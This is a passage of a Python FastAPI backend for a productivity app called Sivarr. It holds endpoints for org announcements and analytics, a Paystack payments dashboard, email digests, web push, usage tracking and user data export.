        "positions": [_mt_norm_position(x) for x in (positions if isinstance(positions, list) else [])],
        "deals":     [_mt_norm_deal(x) for x in (deals if isinstance(deals, list) else [])],
    }


@app.post("/api/integrations/metatrader/disconnect")
async def metatrader_disconnect(data: dict):
    """Unlink the MetaTrader account (best-effort undeploy on MetaApi, then forget locally)."""
    token = data.get("token", "")
    sess  = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    p = load_progress(sid)
    account_id = p.get("metaapi_account_id", "")
    if account_id and METAAPI_AVAILABLE and HTTPX_AVAILABLE:
        try:
            async with _httpx.AsyncClient(timeout=20) as client:
                await client.delete(
                    f"{METAAPI_PROVISION}/users/current/accounts/{account_id}",
                    headers=_metaapi_headers())
        except Exception as exc:
            log.warning(f"MetaApi undeploy failed (forgetting locally anyway): {exc}")
    for k in ("metaapi_account_id", "metaapi_region", "mt_login", "mt_server", "mt_platform"):
        p.pop(k, None)
    save_progress(sid, p)
    return {"ok": True}


# ═══════════════════════════════════════════════════════════════
#  ORG ANNOUNCEMENTS
# ═══════════════════════════════════════════════════════════════

@app.post("/api/org/announce")
async def org_announce(data: dict, bg: BackgroundTasks):
    """Post a new org-wide announcement (admin/owner only)."""
    token = data.get("token","")
    sess  = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    org = db.get_org_by_member(sid)
    if not org:
        raise HTTPException(403, "Not in an organisation.")
    org_id = org["id"]
    role   = org.get("member_role", "member")
    if role not in ("owner","admin"):
        raise HTTPException(403, "Only admins can post announcements.")
    p = load_progress(sid)
    author_name = p.get("name","")
    title  = sanitize_text(data.get("title",""), 200)
    body   = sanitize_text(data.get("body",""), 2000)
    pinned = bool(data.get("pinned", False))
    if not title:
        raise HTTPException(400, "title required.")
    ann_id = str(uuid.uuid4())
    ok = db.create_org_announcement(org_id, ann_id, title, body, sid, author_name, pinned)
    if not ok:
        raise HTTPException(500, "Failed to save announcement.")
    ann = {"id": ann_id, "org_id": org_id, "title": title, "body": body,
           "author_sid": sid, "author_name": author_name,
           "pinned": pinned, "created_at": datetime.datetime.utcnow().isoformat()}
    # Live delivery to every member is handled by the org SSE stream, which DB-polls
    # org_announcements so it works across all Gunicorn workers (in-memory broadcast did not).

    # ── Email all org members (except the author) ─────────────────
    members = db.get_org_members(org_id)
    for m in members:
        if m["sid"] == sid or not m.get("email"):
            continue
        bg.add_task(
            send_email,
            m["email"],
            f"📢 {title} · {org['name']}",
            _email_org_announcement_html(m["name"], org["name"], author_name, title, body),
        )

    return {"ok": True, "ann": ann}


@app.get("/api/org/announcements")
async def org_announcements_list(token: str = ""):
    """List org announcements for the current user's org."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    org = db.get_org_by_member(sess["sid"])
    if not org:
        raise HTTPException(403, "Not in an organisation.")
    return {"announcements": db.get_org_announcements(org["id"])}


@app.delete("/api/org/announce/{ann_id}")
async def org_announce_delete(ann_id: str, token: str = ""):
    """Delete an announcement (admin/owner only)."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    org = db.get_org_by_member(sess["sid"])
    if not org:
        raise HTTPException(403, "Not in an organisation.")
    role = org.get("member_role", "member")
    if role not in ("owner","admin"):
        raise HTTPException(403, "Only admins can delete announcements.")
    db.delete_org_announcement(ann_id)
    return {"ok": True}


# ═══════════════════════════════════════════════════════════════
#  ORG ANALYTICS
# ═══════════════════════════════════════════════════════════════

@app.get("/api/org/analytics")
async def org_analytics(token: str = ""):
    """Return analytics for the current user's org."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    org = db.get_org_by_member(sess["sid"])
    if not org:
        raise HTTPException(403, "Not in an organisation.")
    data = db.get_org_analytics(org["id"])
    if not data:
        return {"members": 0, "tasks_total": 0, "tasks_done": 0,
                "completion_rate": 0, "messages": 0, "docs": 0,
                "status_breakdown": {}, "msg_trend": []}
    return data


# ═══════════════════════════════════════════════════════════════
#  ORG PAYSTACK FINANCIAL DASHBOARD
# ═══════════════════════════════════════════════════════════════

async def _ps_call(secret_key: str, path: str, params: dict | None = None) -> dict:
    """Proxy a GET request to the Paystack API with the given secret key."""
    headers = {"Authorization": f"Bearer {secret_key}"}
    url = f"{PAYSTACK_API}{path}"
    async with _httpx.AsyncClient(timeout=15) as client:
        resp = await client.get(url, headers=headers, params=params or {})
    return resp.json()


def _org_check(token: str) -> tuple[dict, str]:
    """Validate token and return (session, org_id). Raises HTTPException on failure.

    Previously read org_id from the user's personal progress blob
    (p.get("org_id","")) — a field nothing in the codebase ever writes, so
    this always raised 403 for every caller, including org owners. Every
    other org endpoint resolves membership via db.get_org_by_member(sid);
    this now matches that pattern.
    """
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    org = db.get_org_by_member(sess["sid"])
    if not org:
        raise HTTPException(403, "Not in an organisation.")
    return sess, org["id"]


def _org_admin_check(token: str) -> tuple[dict, str]:
    """Like _org_check but also verifies admin/owner role."""
    sess, org_id = _org_check(token)
    # Check role via org_members
    conn = db._get_conn()
    if conn:
        try:
            with conn.cursor(cursor_factory=__import__('psycopg2').extras.RealDictCursor) as cur:
                cur.execute(
                    "SELECT role FROM org_members WHERE org_id=%s AND user_sid=%s",
                    (org_id, sess["sid"])
                )
                row = cur.fetchone()
        finally:
            db._release(conn)
    else:
        row = None

    # Also allow owner check via orgs table
    org = db.get_org(org_id) if hasattr(db, 'get_org') else None
    is_owner = org and org.get("owner_sid") == sess["sid"]
    is_admin = row and row["role"] in ("admin", "owner")
    if not (is_owner or is_admin):
        raise HTTPException(403, "Admin access required.")
    return sess, org_id


@app.post("/api/org/paystack/connect")
async def ps_connect(data: dict):
    """Save org Paystack secret key (admin/owner only)."""
    token      = data.get("token", "")
    secret_key = data.get("secret_key", "").strip()
    if not secret_key:
        raise HTTPException(400, "secret_key required.")
    if not (secret_key.startswith("sk_live_") or secret_key.startswith("sk_test_")):
        raise HTTPException(400, "Invalid Paystack key format.")
    sess, org_id = _org_admin_check(token)
    # Verify key works before saving
    try:
        result = await _ps_call(secret_key, "/balance")
        if not result.get("status"):
            raise HTTPException(400, "Paystack rejected this key. Check it and try again.")
    except _httpx.HTTPError:
        raise HTTPException(502, "Could not reach Paystack to verify key.")
    db.save_org_integration(org_id, "paystack", secret_key)
    return {"ok": True}


@app.delete("/api/org/paystack/disconnect")
async def ps_disconnect(token: str = ""):
    sess, org_id = _org_admin_check(token)
    db.delete_org_integration(org_id, "paystack")
    return {"ok": True}


@app.get("/api/org/paystack/status")
async def ps_status(token: str = ""):
    sess, org_id = _org_check(token)
    row = db.get_org_integration(org_id, "paystack")
    return {"connected": bool(row and row.get("secret_key"))}


def _ps_key_for_org(org_id: str) -> str:
    row = db.get_org_integration(org_id, "paystack")
    if not row or not row.get("secret_key"):
        raise HTTPException(402, "Paystack not connected. Go to Org → Financials → Connect.")
    return row["secret_key"]


@app.get("/api/org/paystack/overview")
async def ps_overview(token: str = ""):
    sess, org_id = _org_admin_check(token)
    key = _ps_key_for_org(org_id)
    # Fetch in parallel
    import asyncio
    txn_task = _ps_call(key, "/transaction", {"perPage": 50, "page": 1})
    bal_task  = _ps_call(key, "/balance")
    stl_task  = _ps_call(key, "/settlement", {"perPage": 5})
    txns_r, bal_r, stl_r = await asyncio.gather(txn_task, bal_task, stl_task, return_exceptions=True)

    txns   = txns_r.get("data", []) if isinstance(txns_r, dict) else []
    total  = txns_r.get("meta", {}).get("total", len(txns)) if isinstance(txns_r, dict) else 0
    bal    = bal_r.get("data", [{}])[0] if isinstance(bal_r, dict) else {}
    stl    = stl_r.get("data", []) if isinstance(stl_r, dict) else []

    success = [t for t in txns if t.get("status") == "success"]
    failed  = [t for t in txns if t.get("status") == "failed"]
    volume  = sum(t.get("amount", 0) for t in success)
    channels: dict = {}
    for t in success:
        ch = t.get("channel", "other")
        channels[ch] = channels.get(ch, 0) + 1

    pending_stl = next((s.get("settlement_date") for s in stl if s.get("status") == "pending"), None)
    pending_amt = next((s.get("total_amount", 0) for s in stl if s.get("status") == "pending"), 0)

    recent = []
    for t in txns[:8]:
        recent.append({
            "reference": t.get("reference", ""),
            "customer":  t.get("customer", {}).get("email", ""),
            "amount":    t.get("amount", 0),
            "channel":   t.get("channel", ""),
            "status":    t.get("status", ""),
            "paid_at":   t.get("paid_at") or t.get("created_at", ""),
            "card_type": t.get("authorization", {}).get("card_type", ""),
            "last4":     t.get("authorization", {}).get("last4", ""),
        })

    return {
        "volume":          volume,
        "txn_count":       total,
        "success_count":   len(success),
        "fail_count":      len(failed),
        "success_rate":    round(len(success) / len(txns) * 100, 1) if txns else 0,
        "available_bal":   bal.get("balance", 0),
        "currency":        bal.get("currency", "NGN"),
        "pending_stl_amt": pending_amt,
        "pending_stl_date":pending_stl,
        "channels":        channels,
        "recent_txns":     recent,
    }


@app.get("/api/org/paystack/transactions")
async def ps_transactions(token: str = "", page: int = 1, perPage: int = 20,
                           status: str = "", channel: str = ""):
    sess, org_id = _org_admin_check(token)
    key = _ps_key_for_org(org_id)
    params: dict = {"perPage": perPage, "page": page}
    if status:  params["status"]  = status
    if channel: params["channel"] = channel
    r = await _ps_call(key, "/transaction", params)
    txns = r.get("data", [])
    meta = r.get("meta", {})
    rows = []
    for t in txns:
        rows.append({
            "reference": t.get("reference", ""),
            "customer":  t.get("customer", {}).get("email", ""),
            "customer_name": (t.get("customer", {}).get("first_name", "") + " " +
                              t.get("customer", {}).get("last_name", "")).strip(),
            "amount":    t.get("amount", 0),
            "channel":   t.get("channel", ""),
            "card_type": t.get("authorization", {}).get("card_type", ""),
            "last4":     t.get("authorization", {}).get("last4", ""),
            "fees":      t.get("fees", 0),
            "status":    t.get("status", ""),
            "paid_at":   t.get("paid_at") or t.get("created_at", ""),
        })
    return {"transactions": rows, "total": meta.get("total", len(rows)),
            "page": page, "perPage": perPage}


@app.get("/api/org/paystack/balance")
async def ps_balance(token: str = ""):
    sess, org_id = _org_admin_check(token)
    key = _ps_key_for_org(org_id)
    import asyncio
    bal_r, txn_r = await asyncio.gather(
        _ps_call(key, "/balance"),
        _ps_call(key, "/transaction", {"perPage": 10, "page": 1}),
        return_exceptions=True
    )
    bal   = bal_r.get("data", [{}])[0] if isinstance(bal_r, dict) else {}
    txns  = txn_r.get("data", []) if isinstance(txn_r, dict) else []
    history = []
    for t in txns:
        if t.get("status") == "success":
            history.append({
                "date":    (t.get("paid_at") or t.get("created_at", ""))[:10],
                "desc":    f"Payment from {t.get('customer',{}).get('email','')}",
                "type":    "transaction",
                "change":  t.get("amount", 0) - t.get("fees", 0),
            })
    return {
        "available": bal.get("balance", 0),
        "currency":  bal.get("currency", "NGN"),
        "history":   history,
    }


@app.get("/api/org/paystack/settlements")
async def ps_settlements(token: str = "", page: int = 1):
    sess, org_id = _org_admin_check(token)
    key = _ps_key_for_org(org_id)
    r = await _ps_call(key, "/settlement", {"perPage": 20, "page": page})
    rows = []
    for s in r.get("data", []):
        rows.append({
            "id":         s.get("id", ""),
            "settled_by": s.get("settled_by", ""),
            "status":     s.get("status", ""),
            "total_amount": s.get("total_amount", 0),
            "total_fees":   s.get("total_fees", 0),
            "txn_count":    s.get("total_transactions", 0),
            "settlement_date": s.get("settlement_date", ""),
            "bank_name":   s.get("bank_name", ""),
            "account_number": s.get("account_number", ""),
        })
    return {"settlements": rows, "total": r.get("meta", {}).get("total", len(rows))}


@app.get("/api/org/paystack/customers")
async def ps_customers(token: str = "", page: int = 1):
    sess, org_id = _org_admin_check(token)
    key = _ps_key_for_org(org_id)
    r = await _ps_call(key, "/customer", {"perPage": 20, "page": page})
    rows = []
    for c in r.get("data", []):
        rows.append({
            "id":          c.get("id", ""),
            "email":       c.get("email", ""),
            "name":        (c.get("first_name", "") + " " + c.get("last_name", "")).strip(),
            "phone":       c.get("phone", ""),
            "txn_count":   c.get("transactions", {}).get("total", 0) if isinstance(c.get("transactions"), dict) else 0,
            "total_spend": c.get("transactions", {}).get("total_volume", 0) if isinstance(c.get("transactions"), dict) else 0,
            "created_at":  c.get("createdAt", "")[:10],
        })
    return {"customers": rows, "total": r.get("meta", {}).get("total", len(rows))}


@app.get("/api/org/paystack/refunds")
async def ps_refunds(token: str = ""):
    sess, org_id = _org_admin_check(token)
    key = _ps_key_for_org(org_id)
    import asyncio
    ref_r, dis_r = await asyncio.gather(
        _ps_call(key, "/refund", {"perPage": 20}),
        _ps_call(key, "/dispute", {"perPage": 20}),
        return_exceptions=True
    )
    refunds = []
    for r in (ref_r.get("data", []) if isinstance(ref_r, dict) else []):
        refunds.append({
            "id":         r.get("id", ""),
            "transaction":r.get("transaction", ""),
            "customer":   r.get("customer_note", ""),
            "amount":     r.get("amount", 0),
            "status":     r.get("status", ""),
            "created_at": r.get("createdAt", "")[:10],
        })
    disputes = []
    for d in (dis_r.get("data", []) if isinstance(dis_r, dict) else []):
        disputes.append({
            "id":          d.get("id", ""),
            "reference":   d.get("transaction", {}).get("reference", "") if isinstance(d.get("transaction"), dict) else "",
            "amount":      d.get("transaction", {}).get("amount", 0) if isinstance(d.get("transaction"), dict) else 0,
            "status":      d.get("status", ""),
            "message":     d.get("resolution", "") or d.get("refund_note", ""),
            "created_at":  d.get("createdAt", "")[:10],
        })
    return {"refunds": refunds, "disputes": disputes}


@app.get("/api/org/paystack/analytics")
async def ps_analytics(token: str = ""):
    sess, org_id = _org_admin_check(token)
    key = _ps_key_for_org(org_id)
    r = await _ps_call(key, "/transaction", {"perPage": 100, "page": 1})
    txns = r.get("data", [])

    from collections import defaultdict
    by_day   = defaultdict(int)
    by_weekday = defaultdict(int)
    total_fees = 0
    success = failed = 0

    for t in txns:
        st  = t.get("status", "")
        amt = t.get("amount", 0)
        fee = t.get("fees", 0) or 0
        paid = (t.get("paid_at") or t.get("created_at") or "")[:10]
        if st == "success":
            success += 1
            total_fees += fee
            if paid:
                by_day[paid] += amt
                try:
                    import datetime
                    wd = datetime.date.fromisoformat(paid).strftime("%a")
                    by_weekday[wd] += amt
                except Exception:
                    pass
        elif st == "failed":
            failed += 1

    total = success + failed
    return {
        "success": success,
        "failed":  failed,
        "success_rate": round(success / total * 100, 1) if total else 0,
        "total_fees":   total_fees,
        "by_day":  dict(sorted(by_day.items())[-14:]),
        "by_weekday": dict(by_weekday),
    }


# ═══════════════════════════════════════════════════════════════
#  EMAIL NOTIFICATIONS (Task reminders)
# ═══════════════════════════════════════════════════════════════

@app.post("/api/notify/tasks")
async def notify_tasks(data: dict):
    """Send a task due-soon reminder email. Max once per day per user."""
    token = data.get("token","")
    sess  = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid  = sess["sid"]
    p    = load_progress(sid)
    today = datetime.date.today().isoformat()
    if p.get("last_reminder_date") == today:
        return {"ok": False, "reason": "already_sent_today"}
    tasks = data.get("tasks", [])
    if not tasks:
        return {"ok": False, "reason": "no_tasks"}
    email = p.get("email","")
    name  = p.get("name","User")
    if not email:
        raise HTTPException(400, "No email on account.")
    ok, detail = send_email(email, f"Tasks due soon · Sivarr",
                            _email_task_reminder_html(name, tasks[:5]))
    if ok:
        p["last_reminder_date"] = today
        save_progress(sid, p)
    return {"ok": ok, "detail": detail}


# ═══════════════════════════════════════════════════════════════
#  DAILY DIGEST — called by Railway cron at 6am UTC (7am WAT)
#  Authorization: Bearer {CRON_SECRET}
# ═══════════════════════════════════════════════════════════════

@app.post("/api/notifications/digest")
async def notifications_digest(request: Request):
    """Send a daily briefing email to every user who has tasks due or goals expiring soon."""
    if CRON_SECRET:
        auth = request.headers.get("Authorization", "")
        if not hmac.compare_digest(auth, f"Bearer {CRON_SECRET}"):
            raise HTTPException(403, "Forbidden")

    today = datetime.date.today().isoformat()
    sent, skipped = 0, 0

    users = load_users()
    targets = []
    if users:
        for email, u in users.items():
            sid = u.get("sid", "")
            if email and sid:
                targets.append((sid, u.get("name", "there"), email))
    else:
        # Fallback: scan goals files for any users not in users.json
        for f in DATA_DIR.glob("*_goals.json"):
            if "backup" in f.name:
                continue
            sid = f.name.replace("_goals.json", "")
            p   = load_progress(sid)
            if p.get("email") and p.get("name"):
                targets.append((sid, p["name"], p["email"]))

    for sid, name, email in targets:
        p = load_progress(sid)
        if p.get("last_digest_date") == today:
            skipped += 1
            continue
        tasks = load_tasks(sid)
        goals = load_goals(sid)
        html  = _email_digest_html(name, tasks, goals)
        if not html:
            skipped += 1
            continue
        ok, _ = send_email(email, f"Good morning, {name}: your Sivarr daily briefing", html)
        if ok:
            p["last_digest_date"] = today
            save_progress(sid, p)
            sent += 1

    return {"ok": True, "sent": sent, "skipped": skipped}


# ═══════════════════════════════════════════════════════════════
#  WEEKLY ORG PROGRESS REPORT — Railway cron every Monday 7am WAT
#  Authorization: Bearer {CRON_SECRET}
# ═══════════════════════════════════════════════════════════════

@app.post("/api/org/notifications/progress-report")
async def org_progress_report(request: Request):
    """Send a weekly progress report email to all members of every org."""
    if CRON_SECRET:
        auth = request.headers.get("Authorization", "")
        if not hmac.compare_digest(auth, f"Bearer {CRON_SECRET}"):
            raise HTTPException(403, "Forbidden")

    if not db.is_available():
        return {"ok": False, "reason": "db_unavailable"}

    today     = datetime.date.today()
    week_ago  = (today - datetime.timedelta(days=7)).isoformat()
    period    = f"{week_ago} → {today.isoformat()}"
    sent, skipped = 0, 0

    for org in db.get_all_orgs():
        org_id   = org["id"]
        org_name = org["name"]
        members  = db.get_org_members(org_id)
        if not members:
            continue

        # Build stats for this org
        all_tasks  = db.get_org_tasks(org_id)
        all_goals  = db.get_org_goals(org_id)
        tasks_done = [t for t in all_tasks if t.get("status") == "done"]
        active_goals = [
            {"title": g["title"], "progress": g.get("progress", 0)}
            for g in all_goals if g.get("status") == "active"
        ]

        # Top contributors — count done tasks per assignee name
        contrib_map: dict = {}
        for t in tasks_done:
            name = t.get("assignee_name") or t.get("author_name") or "Unknown"
            contrib_map[name] = contrib_map.get(name, 0) + 1
        top_contributors = sorted(
            [{"name": n, "done": c} for n, c in contrib_map.items()],
            key=lambda x: x["done"], reverse=True
        )

        # Skip if there's nothing meaningful to report
        if not tasks_done and not active_goals:
            skipped += len(members)
            continue

        for m in members:
            if not m.get("email"):
                skipped += 1
                continue
            ok, _ = send_email(
                m["email"],
                f"Weekly progress report · {org_name}",
                _email_org_progress_html(
                    m["name"], org_name, period,
                    len(tasks_done), len(all_tasks),
                    active_goals, top_contributors,
                ),
            )
            sent += 1 if ok else 0
            skipped += 0 if ok else 1

    return {"ok": True, "sent": sent, "skipped": skipped}


# ═══════════════════════════════════════════════════════════════
#  WEB PUSH NOTIFICATIONS
# ═══════════════════════════════════════════════════════════════

def load_push_subs(sid: str) -> list:
    p = DATA_DIR / f"{sid}_push_subs.json"
    return json.loads(p.read_text(encoding="utf-8")) if p.exists() else []

def save_push_subs(sid: str, subs: list):
    p = DATA_DIR / f"{sid}_push_subs.json"
    save_json(p, subs)

def send_push(sid: str, title: str, body: str, url: str = "/app", tag: str = "sivarr") -> None:
    """Fire-and-forget push to all of a user's subscriptions. Cleans dead endpoints."""
    if not WEBPUSH_AVAILABLE or not VAPID_PRIVATE_KEY or not VAPID_PUBLIC_KEY:
        return
    subs    = load_push_subs(sid)
    dead    = []
    payload = json.dumps({"title": title, "body": body, "url": url, "tag": tag})
    for sub in subs:
        try:
            _webpush(
                subscription_info=sub,
                data=payload,
                vapid_private_key=VAPID_PRIVATE_KEY,
                vapid_claims={"sub": VAPID_EMAIL},
            )
        except WebPushException as exc:
            if exc.response and exc.response.status_code in (404, 410):
                dead.append(sub.get("endpoint", ""))
        except Exception:
            pass
    if dead:
        save_push_subs(sid, [s for s in subs if s.get("endpoint") not in dead])

@app.get("/api/push/vapid-public")
async def push_vapid_public():
    return {"public_key": VAPID_PUBLIC_KEY, "available": bool(VAPID_PUBLIC_KEY)}

@app.post("/api/push/subscribe")
async def push_subscribe(data: dict):
    token = data.get("token", "")
    sess  = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    sub = data.get("subscription")
    if not sub or not isinstance(sub, dict) or not sub.get("endpoint"):
        raise HTTPException(400, "Valid subscription object required.")
    subs     = load_push_subs(sid)
    endpoint = sub["endpoint"]
    subs     = [s for s in subs if s.get("endpoint") != endpoint]  # dedup
    subs.append(sub)
    save_push_subs(sid, subs[-5:])  # keep max 5 per user
    return {"ok": True}

@app.post("/api/push/unsubscribe")
async def push_unsubscribe(data: dict):
    token = data.get("token", "")
    sess  = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid      = sess["sid"]
    endpoint = data.get("endpoint", "")
    subs     = [s for s in load_push_subs(sid) if s.get("endpoint") != endpoint]
    save_push_subs(sid, subs)
    return {"ok": True}


# ═══════════════════════════════════════════════════════════════
#  FEATURE TRACKING  — /api/track
# ═══════════════════════════════════════════════════════════════

@app.post("/api/track")
async def track_event(data: dict):
    """Record a lightweight feature-usage event (nav, action, etc.)."""
    token = data.get("token", "")
    sess  = get_session_from_token(token)
    if not sess:
        return {"ok": False}  # fail silently — never block the UI
    event = sanitize_text(str(data.get("event", "")), 30)
    panel = sanitize_text(str(data.get("panel", "")), 50)
    today = datetime.date.today().isoformat()

    metrics_path = DATA_DIR / f"metrics_{today}.json"
    try:
        metrics = json.loads(metrics_path.read_text(encoding="utf-8")) if metrics_path.exists() else {}
    except Exception:
        metrics = {}

    # DAU — set of unique sids who touched the app today
    dau = set(metrics.get("dau", []))
    dau.add(sess["sid"])
    metrics["dau"] = list(dau)

    # Panel / feature nav counts
    if event == "nav" and panel:
        nav_counts = metrics.get("nav", {})
        nav_counts[panel] = nav_counts.get(panel, 0) + 1
        metrics["nav"] = nav_counts

    save_json(metrics_path, metrics)
    return {"ok": True}


# ═══════════════════════════════════════════════════════════════
#  ADMIN METRICS  — /api/admin/metrics
# ═══════════════════════════════════════════════════════════════

@app.get("/api/admin/metrics")
async def admin_metrics(token: str, days: int = 14):
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    days  = min(max(int(days), 1), 90)
    today = datetime.date.today()
    result = {}

    # ── Aggregate daily metrics files ─────────────────────────
    dau_series   = {}
    nav_totals   = {}
    for i in range(days):
        d     = (today - datetime.timedelta(days=i)).isoformat()
        mpath = DATA_DIR / f"metrics_{d}.json"
        if not mpath.exists():
            dau_series[d] = 0
            continue
        try:
            m = json.loads(mpath.read_text(encoding="utf-8"))
        except Exception:
            dau_series[d] = 0
            continue
        dau_series[d] = len(m.get("dau", []))
        for panel, count in m.get("nav", {}).items():
            nav_totals[panel] = nav_totals.get(panel, 0) + count

    result["dau_series"]   = dict(sorted(dau_series.items()))
    result["top_features"] = sorted(nav_totals.items(), key=lambda x: -x[1])[:15]

    # ── WAU (unique users in last 7 days) ─────────────────────
    wau_sids = set()
    for i in range(7):
        d     = (today - datetime.timedelta(days=i)).isoformat()
        mpath = DATA_DIR / f"metrics_{d}.json"
        if mpath.exists():
            try:
                m = json.loads(mpath.read_text(encoding="utf-8"))
                wau_sids.update(m.get("dau", []))
            except Exception:
                pass
    result["wau"] = len(wau_sids)
    result["dau"] = dau_series.get(today.isoformat(), 0)

    # ── Signup stats (from users file + DB) ───────────────────
    users = load_users()
    result["total_users"] = len(users)

    # ── Subscription conversion ───────────────────────────────
    paid = 0
    if db.is_available():
        try:
            db_stats = db.get_platform_stats()
            result["db_stats"] = db_stats
        except Exception:
            pass

    result["days"] = days
    return result


# ═══════════════════════════════════════════════════════════════
#  DATA EXPORT  — POST /api/export  →  ZIP download
# ═══════════════════════════════════════════════════════════════

def _csv_bytes(rows: list, fieldnames: list) -> str:
    buf = io.StringIO()
    w   = csv.DictWriter(buf, fieldnames=fieldnames, extrasaction='ignore')
    w.writeheader()
    for r in rows:
        w.writerow({f: r.get(f, '') for f in fieldnames})
    return buf.getvalue()

@app.post("/api/export")
async def export_data(data: dict):
    """
    Build and return a ZIP with all user data.
    Client sends localStorage-only data (habits, journal) alongside the token.
    """
    token = data.get("token", "")
    sess  = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    p   = load_progress(sid)

    # Client provides localStorage-only data
    client_habits  = data.get("habits",  []) or []
    client_journal = data.get("journal", []) or []
    client_finance = data.get("finance", {}) or {}
    client_skills  = data.get("skills",  []) or []

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:

        # ── tasks.csv ──────────────────────────────────────────
        tasks = load_tasks(sid)
        if tasks:
            zf.writestr("tasks.csv", _csv_bytes(tasks, [
                "title", "status", "done", "date", "time", "priority", "type"
            ]))

        # ── goals.csv ──────────────────────────────────────────
        goals = load_goals(sid)
        if goals:
            zf.writestr("goals.csv", _csv_bytes(goals, [
                "title", "subject", "target_score", "deadline", "progress", "completed"
            ]))

        # ── habits.csv ─────────────────────────────────────────
        habits = client_habits or load_habits(sid)
        if habits:
            zf.writestr("habits.csv", _csv_bytes(habits, [
                "title", "emoji", "frequency", "streak"
            ]))

        # ── notes.md (docs) ────────────────────────────────────
        docs = load_docs(sid)
        if docs:
            lines = []
            for d in docs:
                title   = d.get("title") or "Untitled"
                content = (d.get("content") or "").strip()
                lines.append(f"# {title}\n\n{content}\n\n---\n")
            zf.writestr("notes.md", "\n".join(lines))

        # ── journal.md ─────────────────────────────────────────
        journal = client_journal or load_journal(sid)
        if journal:
            lines = []
            for e in journal:
                date = e.get("date", "")
                text = (e.get("text") or e.get("content") or e.get("entry") or "").strip()
                mood = e.get("mood", "")
                header = f"## {date}" + (f" ({mood})" if mood else "")
                lines.append(f"{header}\n\n{text}\n\n---\n")
            zf.writestr("journal.md", "\n".join(lines))

        # ── skills.csv ─────────────────────────────────────────
        sk_list = client_skills
        if not sk_list and db.is_available():
            blob = db.get_user_blob(sid, "skills")
            sk_list = (blob or {}).get("skills", [])
        if sk_list:
            zf.writestr("skills.csv", _csv_bytes(sk_list, [
                "name", "category", "level", "target", "sessions", "total_mins", "last_practiced"
            ]))

        # ── finance.csv ────────────────────────────────────────
        fin_txs = (client_finance.get("transactions") or []) if isinstance(client_finance, dict) else []
        if not fin_txs and db.is_available():
            blob = db.get_user_blob(sid, "finance")
            fin_txs = (blob or {}).get("transactions", [])
        if fin_txs:
            zf.writestr("finance.csv", _csv_bytes(fin_txs, [
                "date", "type", "category", "amount", "note"
            ]))

        # ── profile.json ───────────────────────────────────────
        zf.writestr("profile.json", json.dumps({
            "name":      p.get("name", ""),
            "email":     p.get("email", ""),
            "exported":  datetime.datetime.now().isoformat(),
            "version":   VERSION,
        }, indent=2))

    buf.seek(0)
    safe_name = re.sub(r'[^a-z0-9]', '', (p.get("name","sivarr") or "sivarr").lower().split()[0])
    filename  = f"sivarr-export-{safe_name}-{datetime.date.today().isoformat()}.zip"
    return Response(
        content=buf.read(),
        media_type="application/zip",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


# ═══════════════════════════════════════════════════════════════
#  DATA IMPORT
# ═══════════════════════════════════════════════════════════════
# /api/import/goals now lives in routes/goals.py, colocated with the rest of
# the goals API. /api/import/tasks and /api/import/notes are in their own
# route modules the same way.



@app.get("/health")
async def railway_health():
    """Railway healthcheck — cached 5 s so frequent pings don't hammer the DB."""
    now = time.time()
    if now - _health_cache["ts"] < 5 and _health_cache["result"]:
        return _health_cache["result"]

    db_info = await asyncio.to_thread(db.db_test)
    db_ok   = db_info.get("ping", False)
    result  = {
        "status":    "ok" if db_ok else "degraded",
        "version":   VERSION,
        "uptime_s":  int(now - _START_TIME),
        "db":        db_ok,
        "db_ms":     db_info.get("latency_ms"),
        "db_error":  db_info.get("error"),
        "ai":        GEMINI_AVAILABLE,
        "time":      datetime.datetime.utcnow().isoformat() + "Z",
    }
    _health_cache["result"] = result
    _health_cache["ts"]     = now
    return result